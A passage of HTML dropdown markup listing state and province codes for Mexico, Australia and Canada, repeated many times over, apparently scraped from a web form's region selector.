value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option 